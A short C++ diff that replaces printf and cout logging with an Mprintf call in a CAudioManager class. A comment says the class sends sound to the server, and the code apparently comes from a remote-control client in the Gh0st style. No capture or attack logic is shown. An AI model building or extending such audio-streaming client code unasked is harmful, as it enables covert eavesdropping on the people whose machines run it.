@@ -17,7 +17,7 @@ using namespace std;
 
 CAudioManager::CAudioManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
 {
-	printf("new CAudioManager %p\n", this);
+	Mprintf("new CAudioManager %p\n", this);
 
 	m_bIsWorking = FALSE;
 	m_AudioObject = NULL;
@@ -65,7 +65,7 @@ DWORD CAudioManager::WorkThread(LPVOID lParam)   //发送声音到服务端
 			Sleep(50);
 	}
 
-	cout<<"CAudioManager WorkThread end\n";
+	Mprintf("CAudioManager WorkThread end\n");
 
 	return 0;
 }
@@ -110,7 +110,7 @@ CAudioManager::~CAudioManager()
 		delete [] szPacket;
 		szPacket = NULL;
 	}
-	printf("~CAudioManager %p\n", this);
+	Mprintf("~CAudioManager %p\n", this);
 }
 
 //USB  
